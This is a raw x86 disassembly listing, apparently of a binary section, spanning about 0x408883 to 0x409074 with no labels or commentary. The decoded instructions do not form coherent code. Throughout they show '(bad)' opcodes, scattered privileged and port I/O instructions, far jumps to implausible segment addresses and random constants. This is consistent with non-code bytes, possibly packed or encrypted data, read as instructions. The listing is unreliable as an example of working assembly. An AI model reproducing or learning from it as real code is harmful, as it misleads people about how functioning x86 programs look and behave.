  408883:	adc    BYTE PTR [esi+edi*8+0x4bbc395a],0xe2
  40888b:	xchg   edi,eax
  40888c:	fincstp 
  40888e:	push   ecx
  40888f:	cmp    DWORD PTR [ebx+0x57],esi
  408892:	xchg   ecx,eax
  408893:	out    dx,eax
  408894:	shr    DWORD PTR [esi-0xb76af72],1
  40889a:	repnz mov eax,0x298852dc
  4088a0:	adc    bl,BYTE PTR [ebx+0x7a0893e]
  4088a6:	lds    esp,FWORD PTR [esi]
  4088a8:	jecxz  0x4088d8
  4088aa:	push   cs
  4088ab:	clc    
  4088ac:	mov    ecx,0x10f1ffad
  4088b1:	(bad)  
  4088b3:	sub    ebx,ecx
  4088b5:	mov    al,ds:0xdeecf30
  4088ba:	add    DWORD PTR es:[edx+0x14af3201],eax
  4088c1:	xchg   esp,eax
  4088c3:	out    dx,eax
  4088c4:	int    0x20
  4088c6:	or     BYTE PTR [edi+0x3d],al
  4088c9:	and    esp,DWORD PTR [ecx+0x2787b01c]
  4088cf:	jp     0x40891b
  4088d1:	cmp    ebp,0xffffff8a
  4088d4:	xchg   ebx,eax
  4088d5:	stos   BYTE PTR es:[edi],al
  4088d6:	call   0x40f5ebe0
  4088db:	inc    edi
  4088dc:	inc    esi
  4088dd:	inc    edx
  4088de:	and    bh,BYTE PTR [edx]
  4088e0:	and    DWORD PTR [ebx],esp
  4088e2:	icebp  
  4088e3:	xchg   edi,eax
  4088e4:	addr16 stc 
  4088e6:	test   eax,0x4f66ae6
  4088eb:	jno    0x4088c2
  4088ed:	xor    eax,0x441a578
  4088f2:	sar    DWORD PTR [ebx],1
  4088f4:	outs   dx,BYTE PTR ds:[esi]
  4088f5:	cmc    
  4088f6:	test   DWORD PTR [ebx-0x2e],ebx
  4088f9:	fcom   QWORD PTR [eax]
  4088fb:	mov    esp,0x401f5ab3
  408900:	sbb    al,BYTE PTR [ecx-0x7e]
  408903:	pushf  
  408904:	sub    edi,DWORD PTR [eax*4-0x6d7e6bba]
  40890b:	sub    DWORD PTR [eax+eiz*4-0x7cf6079d],ebx
  408912:	cmp    DWORD PTR [esi],edx
  408914:	mov    ds:0x64eb23ed,eax
  408919:	dec    ebp
  40891a:	pop    ecx
  40891b:	or     DWORD PTR [edi+0x440a6a94],esp
  408921:	mov    al,0x92
  408923:	jbe    0x40897e
  408925:	retf   0xdbdc
  408928:	imul   edx,DWORD PTR [eax],0xffffffdc
  40892b:	pusha  
  40892c:	call   0x1d8c3db6
  408931:	jne    0x408924
  408933:	dec    edi
  408934:	cs mov ss,edx
  408937:	int3   
  408938:	xchg   ecx,eax
  408939:	mov    cl,0x55
  40893b:	es mov edi,0xb377675b
  408941:	rol    BYTE PTR [ecx],0x94
  408944:	push   esi
  408945:	in     al,dx
  408946:	in     al,dx
  408947:	cli    
  408948:	arpl   WORD PTR [ecx-0x31],sp
  40894b:	aas    
  40894c:	shl    DWORD PTR [edx+0x438891dd],1
  408952:	mov    ah,0x70
  408954:	mov    BYTE PTR [ecx-0x78],cl
  408957:	xor    ah,dl
  408959:	and    DWORD PTR [edi-0x2834364e],ebp
  40895f:	lods   eax,DWORD PTR ds:[esi]
  408960:	or     DWORD PTR [ecx+edx*4],esp
  408963:	ret    
  408964:	iret   
  408965:	mov    DWORD PTR [ebp+ebp*8-0x5b],ebp
  408969:	inc    ebx
  40896a:	test   al,0x69
  40896c:	cdq    
  40896d:	in     eax,dx
  40896e:	pop    ecx
  40896f:	cmp    BYTE PTR [eax-0x21222288],bl
  408975:	jp     0x4088fa
  408977:	jb     0x4089e2
  408979:	pop    ecx
  40897a:	pop    ds
  40897b:	xchg   esp,eax
  40897c:	pop    ebp
  40897d:	sbb    DWORD PTR [edx],ebp
  40897f:	jge    0x408926
  408981:	jle    0x4089f1
  408983:	out    dx,al
  408984:	sar    DWORD PTR [ebx-0x75b59ed1],cl
  40898a:	mov    edx,0xa36c2592
  40898f:	shr    BYTE PTR [esi+0x98ca34b],1
  408995:	ja     0x408951
  408997:	pushf  
  408998:	sub    esi,edx
  40899a:	es fdivr DWORD PTR ds:[ebx]
  40899e:	adc    cl,BYTE PTR [edi-0x414f9af6]
  4089a4:	mov    esi,0x30637d3f
  4089a9:	mov    BYTE PTR [ebx+0x37],ah
  4089ac:	pop    eax
  4089ad:	and    eax,0xa9a474d5
  4089b2:	push   esp
  4089b3:	jmp    0x49878af1
  4089b8:	mov    esi,0x61d90881
  4089bd:	test   BYTE PTR [esi],ch
  4089bf:	sbb    al,0x8f
  4089c1:	ret    
  4089c2:	xor    al,0x52
  4089c4:	aad    0x26
  4089c6:	pop    edi
  4089c7:	fnstenv [esp+edi*1]
  4089ca:	int    0x37
  4089cc:	lahf   
  4089cd:	shl    ch,0x74
  4089d0:	(bad)  
  4089d2:	mov    BYTE PTR [eax+0xfc5dbc4],0x8a
  4089d9:	data16 sbb BYTE PTR [ecx-0xc],bl
  4089dd:	dec    edx
  4089de:	pop    edx
  4089df:	pop    edi
  4089e0:	sub    BYTE PTR [edx+0x5d9f79db],ch
  4089e6:	ltr    WORD PTR ds:0xe842630e
  4089ed:	add    eax,0x6c18fc92
  4089f2:	ja     0x4089cb
  4089f4:	mov    WORD PTR [esp+esi*8],ds
  4089f7:	pop    eax
  4089f8:	push   0x796f376b
  4089fd:	fucomip st,st(3)
  4089ff:	inc    eax
  408a00:	repnz sbb edx,0x1a2231e6
  408a07:	ss cmc 
  408a09:	js     0x4089db
  408a0b:	in     al,dx
  408a0c:	pop    ecx
  408a0d:	inc    esi
  408a0e:	adc    BYTE PTR [edi+edx*1-0x6b0ff8c1],dh
  408a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a16:	adc    BYTE PTR [edi],cl
  408a18:	popa   
  408a19:	idiv   BYTE PTR [edi+ecx*1+0x59]
  408a1d:	retf   0x4da
  408a20:	pusha  
  408a21:	mov    cl,0xe7
  408a23:	fisttp WORD PTR [ebx+0x63]
  408a26:	nop
  408a27:	or     al,0x66
  408a29:	in     al,0x82
  408a2b:	dec    ebx
  408a2c:	lea    edx,[ebx+ebx*2]
  408a2f:	fstp   QWORD PTR [eax]
  408a31:	cmp    al,0x9a
  408a33:	cmp    eax,0xf55b0d0c
  408a38:	cdq    
  408a39:	lods   al,BYTE PTR ds:[esi]
  408a3a:	enter  0x664,0x46
  408a3e:	repz sub DWORD PTR [esi+0x79],edx
  408a42:	sub    ah,BYTE PTR [esi]
  408a44:	xchg   edx,eax
  408a45:	cmp    eax,0xe722476c
  408a4a:	retf   0x5450
  408a4d:	jae    0x408a63
  408a4f:	jle    0x4089dc
  408a51:	icebp  
  408a52:	test   al,0xa6
  408a54:	das    
  408a55:	enter  0xe55f,0xac
  408a59:	adc    bh,ah
  408a5b:	add    DWORD PTR [ebp+0x6bafae7c],esp
  408a61:	push   esp
  408a62:	sbb    BYTE PTR [ecx-0x41],bh
  408a65:	sbb    ecx,DWORD PTR [eax+0x306bfa99]
  408a6b:	or     BYTE PTR [ecx+0x1c],bl
  408a6e:	add    ch,BYTE PTR [ebp-0x5e]
  408a71:	jg     0x408a2e
  408a73:	pop    esi
  408a74:	mov    esi,0xc2501018
  408a79:	mov    dh,0x9f
  408a7b:	lods   al,BYTE PTR ds:[esi]
  408a7c:	adc    al,0xc1
  408a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a7f:	retf   0x6693
  408a82:	sub    BYTE PTR [ecx-0x16],ah
  408a85:	outs   dx,BYTE PTR ds:[esi]
  408a86:	test   BYTE PTR [ecx-0x2092e468],0xf7
  408a8d:	sbb    DWORD PTR [esi-0x26],eax
  408a90:	sbb    al,BYTE PTR es:[edx+0x49cb9f75]
  408a97:	or     DWORD PTR [edx+0x53],eax
  408a9a:	stc    
  408a9b:	cmp    bl,BYTE PTR [edx-0x531966b7]
  408aa1:	adc    BYTE PTR [edi-0x2344d02a],ah
  408aa7:	pop    esp
  408aa8:	call   0x93a82f0b
  408aad:	sub    BYTE PTR [ebx+edi*4],bl
  408ab0:	aad    0x6a
  408ab2:	aam    0xc3
  408ab4:	xor    eax,0x84eeec11
  408ab9:	pmulhw mm4,QWORD PTR [ebp+0x538ad9e]
  408ac0:	add    ecx,DWORD PTR [eax-0x7a]
  408ac3:	lds    eax,FWORD PTR [edi+0x5d5ee7f4]
  408ac9:	inc    edi
  408aca:	or     ax,cx
  408acd:	out    0xbe,eax
  408acf:	xlat   BYTE PTR ds:[ebx]
  408ad0:	in     al,0xeb
  408ad2:	jmp    0x704e:0x268d5e25
  408ad9:	or     eax,0x946376a
  408ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408adf:	fisttp QWORD PTR [ebp-0x78]
  408ae2:	sub    edx,DWORD PTR [ecx-0xf]
  408ae5:	jne    0x408b18
  408ae7:	lods   al,BYTE PTR ds:[esi]
  408ae8:	stos   DWORD PTR es:[edi],eax
  408ae9:	mov    dh,0x21
  408aeb:	daa    
  408aec:	mov    esp,0xf13eccd3
  408af1:	dec    ecx
  408af2:	loopne 0x408aa2
  408af4:	mov    ecx,0xb40bbae9
  408af9:	add    BYTE PTR [ecx-0x786eaf56],al
  408aff:	cli    
  408b00:	jbe    0x408b4b
  408b02:	pop    ecx
  408b03:	xchg   edx,eax
  408b04:	add    esi,DWORD PTR [edx]
  408b06:	mov    BYTE PTR [ebx-0x1e],0xd6
  408b0a:	sbb    eax,0x7549546e
  408b0f:	push   0xffffff99
  408b11:	ss iret 
  408b13:	mov    bh,0xde
  408b15:	idiv   dl
  408b17:	push   eax
  408b18:	sub    DWORD PTR [ebp+0xdd2547c],esp
  408b1e:	or     al,0xce
  408b20:	push   esi
  408b21:	pop    esp
  408b22:	jmp    0x54d0:0x8d5a26a7
  408b29:	bswap  ecx
  408b2b:	ror    BYTE PTR [edx],1
  408b2d:	or     DWORD PTR [ebx],ebp
  408b2f:	(bad)  
  408b30:	aad    0x30
  408b32:	jmp    0x6572bfd6
  408b37:	or     eax,0xa02c2e65
  408b3c:	frstor [esi-0x43]
  408b3f:	test   BYTE PTR [esi+eiz*2],dl
  408b42:	(bad)  
  408b43:	lahf   
  408b44:	aam    0x9
  408b46:	mov    ebp,0x36ee6184
  408b4b:	dec    eax
  408b4c:	cmp    eax,0x981d1366
  408b51:	cld    
  408b52:	cmp    cl,ch
  408b54:	(bad)  
  408b55:	push   0x3e
  408b57:	fld    TBYTE PTR [esi+eax*1-0x74e1a600]
  408b5e:	into   
  408b5f:	mov    bl,0xa0
  408b61:	sub    ch,BYTE PTR [edx+0x6e]
  408b64:	mov    eax,0xf21aeac0
  408b69:	fwait
  408b6a:	mov    edx,0xd1b1d285
  408b6f:	jle    0x408bc8
  408b71:	mov    dh,0xa0
  408b73:	dec    esi
  408b74:	mov    DWORD PTR [ecx+0x63f4f8e6],edi
  408b7a:	sbb    eax,0x777a99d6
  408b7f:	fbld   TBYTE PTR [ecx]
  408b81:	test   eax,0x148883fe
  408b86:	in     al,0x57
  408b88:	jmp    0xe3dc:0xa546a5b7
  408b8f:	pop    edx
  408b90:	or     ebx,DWORD PTR [ebp+0x73bfa015]
  408b96:	repz scas eax,DWORD PTR es:[edi]
  408b98:	loop   0x408b2e
  408b9a:	shr    bh,cl
  408b9c:	imul   esp,DWORD PTR [edx+0x46],0xffffffca
  408ba0:	inc    ebp
  408ba1:	mov    esi,0xd72440d5
  408ba6:	aaa    
  408ba7:	repz xor esi,DWORD PTR [ebx]
  408baa:	xor    BYTE PTR [ebp-0x5bbb8e74],dh
  408bb0:	sub    al,0x81
  408bb2:	fst    QWORD PTR [ebx+0x2dfdc3be]
  408bb8:	inc    ebx
  408bb9:	imul   esp
  408bbb:	mov    edi,0x27ddca4e
  408bc0:	sbb    BYTE PTR [esi-0x49de46bb],0xa2
  408bc7:	test   DWORD PTR [eax+0x65c93050],edi
  408bcd:	push   ebp
  408bce:	cmp    al,BYTE PTR [edx-0x4b87fe39]
  408bd4:	add    al,0xe9
  408bd6:	aam    0x4f
  408bd8:	dec    eax
  408bd9:	cmp    eax,0xca47e7d0
  408bde:	jmp    0xc7be82d1
  408be3:	sbb    al,0x1
  408be5:	sub    al,0x2c
  408be7:	ins    DWORD PTR es:[edi],dx
  408be8:	clc    
  408be9:	xchg   ebp,eax
  408bea:	push   eax
  408beb:	sub    BYTE PTR [ebp-0x75734196],cl
  408bf1:	cld    
  408bf2:	and    dl,BYTE PTR [ebp+edx*2-0x69]
  408bf6:	mov    eax,0x47cbe76a
  408bfb:	jmp    0xe2f7dd2
  408c00:	mov    es,WORD PTR [edx-0x3c]
  408c03:	mov    bh,0x6e
  408c05:	ret    
  408c06:	nop
  408c07:	xchg   esi,eax
  408c08:	push   0x2
  408c0a:	or     BYTE PTR [edx-0x3d],al
  408c0d:	cmp    al,0xcb
  408c0f:	push   ecx
  408c10:	and    DWORD PTR [edi+0x54070633],ebx
  408c16:	loopne 0x408c1a
  408c18:	movd   DWORD PTR [esi-0x70a53cda],mm1
  408c1f:	addr16 aaa 
  408c21:	lods   al,BYTE PTR ds:[esi]
  408c22:	in     al,0xf0
  408c24:	pusha  
  408c25:	popa   
  408c26:	fisttp WORD PTR [eax+0x4e]
  408c29:	xchg   cl,dl
  408c2b:	push   eax
  408c2c:	je     0x408c2b
  408c2e:	ret    
  408c2f:	test   al,0xa0
  408c31:	or     al,0x80
  408c33:	dec    BYTE PTR [eax-0x647eee57]
  408c39:	ret    0xd2
  408c3c:	out    dx,al
  408c3d:	test   al,0x32
  408c3f:	fiadd  WORD PTR [esi]
  408c41:	mov    ch,0xa5
  408c43:	hlt    
  408c44:	xor    eax,0x45d72fc3
  408c49:	cmp    edx,DWORD PTR [eax]
  408c4b:	popa   
  408c4c:	push   ds
  408c4d:	xor    al,0xdb
  408c4f:	push   es
  408c50:	xchg   eax,esp
  408c52:	mov    dh,0x32
  408c54:	ins    BYTE PTR es:[edi],dx
  408c55:	push   edx
  408c56:	cmp    DWORD PTR [ecx+0x1e4cd047],esp
  408c5c:	ins    DWORD PTR es:[edi],dx
  408c5d:	mov    ah,0xe1
  408c5f:	pop    es
  408c60:	adc    al,0x3b
  408c62:	and    al,0xaf
  408c64:	sbb    BYTE PTR [esi-0x22],dh
  408c67:	xchg   edx,eax
  408c68:	mov    dh,0xd5
  408c6a:	add    DWORD PTR [ecx+edi*2],0x91a6291b
  408c71:	cmc    
  408c72:	stos   BYTE PTR es:[edi],al
  408c73:	ror    BYTE PTR [edi],1
  408c75:	push   ds
  408c76:	cwde   
  408c77:	xchg   BYTE PTR [ebp-0x52010449],bh
  408c7d:	mov    ?,WORD PTR [esi]
  408c7f:	push   eax
  408c80:	pop    ebx
  408c81:	in     al,0xe0
  408c83:	sub    cl,BYTE PTR [eax+0x23]
  408c86:	mov    ah,0x9c
  408c88:	lea    ebp,[esi-0x36]
  408c8b:	call   0xf774:0x669f9544
  408c92:	push   0x2433981a
  408c97:	pop    edx
  408c98:	lods   al,BYTE PTR ds:[esi]
  408c99:	lods   al,BYTE PTR ds:[esi]
  408c9a:	mov    esp,0x62fa988d
  408c9f:	gs stc 
  408ca1:	sub    ebp,0x7b10cc03
  408ca7:	data16 out 0xff,al
  408caa:	loope  0x408c5e
  408cac:	jp     0x408ca4
  408cae:	add    al,BYTE PTR [edx+0x11]
  408cb1:	push   0x99879903
  408cb6:	add    ch,bh
  408cb8:	dec    edx
  408cb9:	and    ecx,DWORD PTR [eax-0x76a1718]
  408cbf:	das    
  408cc0:	add    al,0x3c
  408cc2:	push   ebx
  408cc3:	(bad)  
  408cc4:	aas    
  408cc5:	fild   DWORD PTR [ebx-0x11]
  408cc8:	enter  0x621f,0xea
  408ccc:	mov    ds:0xaa7b9757,al
  408cd1:	mov    al,ds:0x2724b3bc
  408cd6:	mov    ds:0x5d07442,eax
  408cdb:	imul   ebp,DWORD PTR fs:[edi+0xf1bd0cc],0xffffffae
  408ce3:	test   ah,dh
  408ce5:	xchg   ebx,eax
  408ce6:	cmp    ah,cl
  408ce8:	xchg   ebx,eax
  408ce9:	iret   
  408cea:	jecxz  0x408d36
  408cec:	sar    BYTE PTR [edi],1
  408cee:	or     al,0x5d
  408cf0:	je     0x408cef
  408cf2:	xchg   edi,eax
  408cf3:	cwde   
  408cf4:	cld    
  408cf5:	adc    ebx,esi
  408cf7:	mov    DWORD PTR [edi],0x81cd7138
  408cfd:	mov    BYTE PTR [eax-0x3588dfb5],cl
  408d03:	test   eax,0xe327622a
  408d08:	or     DWORD PTR [edi],ebx
  408d0a:	and    cl,BYTE PTR [ecx-0x26608a9c]
  408d10:	mov    al,ds:0x7375b8b4
  408d15:	bound  ecx,QWORD PTR [ebx]
  408d17:	imul   eax,ebp,0x0
  408d1a:	aad    0xf7
  408d1c:	inc    ebp
  408d1d:	scas   eax,DWORD PTR es:[edi]
  408d1e:	add    edx,DWORD PTR [ebp-0x137822a6]
  408d24:	cmp    al,0x62
  408d26:	out    dx,eax
  408d27:	sbb    BYTE PTR [esi-0x3079d5dc],bh
  408d2d:	mov    edi,0x5707b701
  408d32:	(bad)  
  408d33:	aad    0x8
  408d35:	std    
  408d36:	or     al,0x2b
  408d38:	and    eax,0x9ce02311
  408d3d:	push   eax
  408d3e:	nop
  408d3f:	xchg   edi,eax
  408d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d41:	sub    ebx,0x7f
  408d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d45:	adc    eax,0xfdbba32f
  408d4a:	sbb    BYTE PTR [ebx+0x295587ab],al
  408d50:	xor    DWORD PTR [ecx],0x2c4c77b4
  408d56:	imul   dh
  408d58:	fcmovbe st,st(3)
  408d5a:	jl     0x408d60
  408d5c:	lahf   
  408d5d:	jge    0x408d3b
  408d5f:	pushf  
  408d60:	push   ds
  408d61:	mov    ecx,0x17252331
  408d66:	dec    esi
  408d67:	adc    eax,edi
  408d69:	fwait
  408d6a:	pop    ebp
  408d6b:	js     0x408dbc
  408d6d:	dec    eax
  408d6e:	cld    
  408d6f:	outs   dx,BYTE PTR ds:[esi]
  408d70:	in     al,dx
  408d71:	xchg   ebx,eax
  408d72:	nop
  408d73:	xchg   DWORD PTR [eax],ecx
  408d75:	mov    bl,0xb9
  408d77:	ret    
  408d78:	inc    ebx
  408d79:	int    0x1a
  408d7b:	mov    eax,0x911bcd7
  408d80:	jecxz  0x408d05
  408d82:	jns    0x408dbb
  408d84:	sti    
  408d85:	sbb    eax,0xba5eed97
  408d8a:	mov    esi,DWORD PTR [ebp+0x4a]
  408d8d:	aad    0x9b
  408d8f:	mov    edx,0x84b71041
  408d94:	mul    BYTE PTR ds:0xd3180826
  408d9a:	in     eax,dx
  408d9b:	pusha  
  408d9c:	xor    eax,0xd899f7e2
  408da1:	add    esp,DWORD PTR [ecx]
  408da3:	mov    ecx,0x4c902764
  408da8:	stc    
  408da9:	out    dx,eax
  408daa:	dec    esi
  408dab:	mov    esp,0xdecaa694
  408db0:	or     eax,esi
  408db2:	rol    cl,0xa0
  408db5:	pop    esi
  408db6:	mov    BYTE PTR [eax+0x6],bh
  408db9:	jnp    0x408d53
  408dbb:	gs add al,ah
  408dbe:	in     al,0xac
  408dc0:	mov    ebp,0x44a7b941
  408dc5:	xchg   DWORD PTR [eax+0x12],ebp
  408dc8:	mov    esp,0x747e0e74
  408dcd:	xor    al,BYTE PTR [ebp-0x16]
  408dd0:	out    dx,al
  408dd1:	fild   DWORD PTR [eax+0x59]
  408dd4:	loope  0x408e1e
  408dd6:	popf   
  408dd7:	(bad)  
  408dd8:	fadd   QWORD PTR [ebx+ecx*1+0x79]
  408ddc:	mov    al,ds:0x52d69895
  408de1:	push   cs
  408de2:	mov    dh,0x87
  408de4:	or     al,0x74
  408de6:	and    al,0xa9
  408de8:	shl    BYTE PTR [edi],cl
  408dea:	imul   ebx,edi,0x61
  408ded:	scas   al,BYTE PTR es:[edi]
  408dee:	or     eax,0xa364f4b7
  408df3:	push   ebx
  408df4:	bound  ecx,QWORD PTR [edx+0x3c646d7b]
  408dfa:	cmp    dl,BYTE PTR [esi-0x72d8e1e3]
  408e00:	ret    0xa1b4
  408e03:	inc    esp
  408e04:	and    dh,BYTE PTR [edx]
  408e06:	in     al,0x5f
  408e08:	push   0x21
  408e0a:	loopne 0x408df2
  408e0c:	rol    dl,1
  408e0e:	hlt    
  408e0f:	(bad)  
  408e10:	sub    DWORD PTR [edi],edi
  408e12:	jmp    0x7bdea959
  408e17:	(bad)  
  408e18:	in     eax,0xb8
  408e1a:	push   eax
  408e1b:	xchg   ecx,eax
  408e1c:	mov    DWORD PTR ds:0xcc8e22e3,esp
  408e22:	lods   eax,DWORD PTR ds:[esi]
  408e23:	mov    ah,0xb6
  408e25:	shr    BYTE PTR [esi+0x47],0xf2
  408e29:	xor    ecx,esp
  408e2b:	inc    ebp
  408e2c:	inc    ebp
  408e2d:	ins    BYTE PTR es:[edi],dx
  408e2e:	imul   esp,DWORD PTR [ebx],0x6
  408e31:	outs   dx,BYTE PTR ds:[esi]
  408e32:	pop    ebp
  408e33:	(bad)  
  408e34:	dec    edi
  408e35:	adc    dh,BYTE PTR [edi+0x77faf2a8]
  408e3b:	xchg   al,ah
  408e3d:	sub    al,0x4e
  408e3f:	or     cl,BYTE PTR [ebx]
  408e41:	jnp    0x408df6
  408e43:	std    
  408e44:	rol    BYTE PTR [eax],0x9a
  408e47:	or     BYTE PTR ds:0xd09bb775,ch
  408e4d:	das    
  408e4e:	call   0x32edaef
  408e53:	not    DWORD PTR [edx+eiz*1]
  408e56:	in     eax,0x8b
  408e58:	jbe    0x408eb7
  408e5a:	call   0xcb5f6f24
  408e5f:	icebp  
  408e60:	mov    BYTE PTR [ebx-0x39965c4f],bl
  408e66:	or     ebp,esp
  408e68:	mov    dh,0xa6
  408e6a:	pop    edx
  408e6b:	mov    WORD PTR [ecx-0x46],ds
  408e6e:	dec    ecx
  408e6f:	jns    0x408e38
  408e71:	call   0xb7b:0x37308303
  408e78:	popf   
  408e79:	add    ebx,DWORD PTR [edi]
  408e7b:	mov    bl,0xba
  408e7d:	sbb    edx,ebp
  408e7f:	or     DWORD PTR [ebx],0xffffffc8
  408e82:	loopne 0x408efc
  408e84:	and    eax,0x45bda408
  408e89:	or     DWORD PTR [esi],0xffffffbd
  408e8c:	add    eax,0x33e4e025
  408e91:	or     BYTE PTR [ebp+0x20],dl
  408e94:	repz (bad) 
  408e96:	gs jns 0x408e8b
  408e99:	adc    BYTE PTR [ebp+0x1c24c1c2],cl
  408e9f:	mov    dh,0x7
  408ea1:	or     eax,0x5b625601
  408ea6:	fs jmp 0xae3c3f81
  408eac:	push   edx
  408ead:	in     eax,0x9b
  408eaf:	sub    bl,BYTE PTR [eax+edx*4-0x40]
  408eb3:	mov    DWORD PTR [eax+ebx*8-0x49494315],esi
  408eba:	mov    WORD PTR [edi*2-0x65f9e5e7],cs
  408ec1:	aaa    
  408ec2:	test   al,0xaf
  408ec4:	adc    esi,DWORD PTR [eax+0x59615d6b]
  408eca:	loope  0x408f3b
  408ecc:	in     eax,dx
  408ecd:	and    al,0x36
  408ecf:	pop    ebp
  408ed0:	jmp    0x408f3d
  408ed2:	mov    edi,0x2f764e36
  408ed7:	mov    BYTE PTR [eax-0x7d406687],al
  408edd:	sti    
  408ede:	les    esp,FWORD PTR [esi+esi*8-0x47dd78df]
  408ee5:	adc    cl,cl
  408ee7:	stos   BYTE PTR es:[edi],al
  408ee8:	sub    ebp,ecx
  408eea:	push   edx
  408eeb:	loopne 0x408e8e
  408eed:	stc    
  408eee:	test   DWORD PTR [ecx+0x7c],ecx
  408ef1:	inc    edx
  408ef2:	dec    ebx
  408ef3:	pusha  
  408ef4:	mov    ?,WORD PTR [esi-0x1de4f825]
  408efa:	or     esp,esp
  408efc:	neg    BYTE PTR [eax+0x31]
  408eff:	ins    DWORD PTR es:[edi],dx
  408f00:	xlat   BYTE PTR ds:[ebx]
  408f01:	inc    edx
  408f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f03:	pusha  
  408f04:	popa   
  408f05:	adc    ebx,DWORD PTR [ecx+ecx*4-0x14]
  408f09:	in     al,0x89
  408f0b:	loope  0x408f25
  408f0d:	or     DWORD PTR [ebp+0x52],ecx
  408f10:	das    
  408f11:	mov    ds:0x66ca4dca,al
  408f16:	stos   BYTE PTR es:[edi],al
  408f17:	dec    edi
  408f18:	mov    dl,0x98
  408f1a:	movq   mm2,mm2
  408f1d:	in     al,0xe2
  408f1f:	push   esi
  408f20:	mov    bl,0x26
  408f22:	xor    cl,ch
  408f24:	dec    eax
  408f25:	add    esp,DWORD PTR [edi]
  408f27:	mov    BYTE PTR [edx+0x59],cl
  408f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f2b:	ins    DWORD PTR es:[edi],dx
  408f2c:	mov    DWORD PTR [esi-0x8],edx
  408f2f:	jle    0x408fab
  408f31:	in     eax,0xf1
  408f33:	mov    ds:0x53c2d500,eax
  408f38:	fs inc ebx
  408f3a:	push   0x1f7cdfdc
  408f3f:	cmp    BYTE PTR [ecx+ebp*2-0x72],bl
  408f43:	icebp  
  408f44:	arpl   WORD PTR [edi],bp
  408f46:	mov    eax,?
  408f48:	leave  
  408f49:	(bad)  
  408f4a:	xchg   ebx,eax
  408f4b:	dec    ebx
  408f4c:	add    DWORD PTR [ebx],esi
  408f4e:	push   ebp
  408f4f:	retf   0xceb8
  408f52:	scas   eax,DWORD PTR es:[edi]
  408f53:	push   esi
  408f54:	xchg   edx,eax
  408f55:	mov    dl,0x9c
  408f57:	xchg   esi,eax
  408f58:	pop    ds
  408f59:	sar    BYTE PTR [ebx+0x5c],0x40
  408f5d:	outs   dx,BYTE PTR ds:[esi]
  408f5e:	xchg   edi,eax
  408f5f:	loop   0x408f8d
  408f61:	adc    ebx,DWORD PTR [ecx]
  408f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f64:	gs pop di
  408f67:	jb     0x408fb8
  408f69:	sub    dl,bl
  408f6b:	xor    DWORD PTR [esi],ebx
  408f6d:	lds    ebp,FWORD PTR [edi]
  408f6f:	mov    DWORD PTR [edx],ecx
  408f71:	std    
  408f72:	fst    st(3)
  408f74:	mov    edx,0x43df9fff
  408f79:	int    0xbc
  408f7b:	fild   QWORD PTR [edx-0x69f9b1ef]
  408f81:	pop    eax
  408f82:	enter  0x5628,0xf6
  408f86:	test   esi,esp
  408f88:	lods   al,BYTE PTR ds:[esi]
  408f89:	mov    bh,0xbb
  408f8b:	or     al,0x63
  408f8d:	retf   
  408f8e:	imul   ebx,esi,0x23
  408f91:	nop
  408f92:	cdq    
  408f93:	xor    bl,bh
  408f95:	mov    esi,0x45eba8f
  408f9a:	fistp  DWORD PTR [esi+eiz*4-0x7b]
  408f9e:	push   ebp
  408f9f:	sahf   
  408fa0:	add    BYTE PTR [eax],dl
  408fa2:	imul   esi,edi,0xffffffbb
  408fa5:	int    0x9a
  408fa7:	xor    BYTE PTR [esi+ecx*8],0x49
  408fab:	ret    0x5002
  408fae:	dec    eax
  408faf:	inc    eax
  408fb0:	pop    es
  408fb1:	sar    DWORD PTR [ebx+eax*2],0xde
  408fb5:	(bad)  
  408fb7:	idiv   esp
  408fb9:	mov    ss,WORD PTR [esi-0x6bda5c3b]
  408fbf:	test   eax,0x2625cd99
  408fc4:	ss xor ecx,esp
  408fc7:	idiv   DWORD PTR [edi-0x1e]
  408fca:	lds    esp,FWORD PTR fs:[eax+ecx*4]
  408fce:	xchg   ah,dl
  408fd0:	ret    0x2f56
  408fd3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fd5:	test   dh,bl
  408fd7:	xchg   ebx,eax
  408fd8:	out    0xeb,eax
  408fda:	or     eax,0x690d2fee
  408fdf:	add    eax,0xfdf8b04a
  408fe4:	xlat   BYTE PTR ds:[ebx]
  408fe5:	push   edi
  408fe6:	jnp    0x408fe5
  408fe8:	or     DWORD PTR [ebx+0x13],eax
  408feb:	dec    esi
  408fec:	jo     0x409007
  408fee:	xchg   ecx,eax
  408fef:	cli    
  408ff0:	arpl   WORD PTR [ecx],sp
  408ff2:	out    dx,eax
  408ff3:	sub    DWORD PTR [ebx+ecx*1-0x1df35763],0xa6c3b155
  408ffe:	nop
  408fff:	cmp    esp,DWORD PTR [esi]
  409001:	xchg   esp,eax
  409002:	aas    
  409003:	inc    ecx
  409004:	int3   
  409005:	in     al,dx
  409006:	jae    0x40904a
  409008:	adc    eax,0xabad8253
  40900d:	call   0x4c22:0x730e4ce0
  409014:	sub    eax,0x5cf276bc
  409019:	repz mov dh,0xd4
  40901c:	mov    eax,ds:0x5bc5be30
  409021:	mov    esi,0xf054c7dc
  409026:	fild   DWORD PTR [eax-0x4af1b17b]
  40902c:	xchg   BYTE PTR [eax+edi*4-0x565be354],bh
  409033:	xchg   esp,eax
  409034:	inc    BYTE PTR [ecx+0x5e]
  409037:	icebp  
  409038:	test   DWORD PTR [esi-0x63669ea],edi
  40903e:	hlt    
  40903f:	jmp    0x184ebf16
  409044:	lock push ds
  409046:	sbb    eax,0x10e28391
  40904b:	or     eax,ebx
  40904d:	sbb    cl,dh
  40904f:	js     0x408fe2
  409051:	pop    esi
  409052:	inc    ebx
  409053:	daa    
  409054:	jbe    0x409082
  409056:	dec    esp
  409057:	sahf   
  409058:	fwait
  409059:	jno    0x4090c0
  40905b:	xor    BYTE PTR ss:[edi-0x5a808ffc],al
  409062:	sbb    ah,ah
  409064:	out    dx,eax
  409065:	fisub  WORD PTR [bx+0x5f9a]
  40906a:	adc    BYTE PTR [ebx+0x4340a82c],0xce
  409071:	shl    DWORD PTR [edi+0x11],cl
  409074:	mov    ds:0xfd009ed7,al
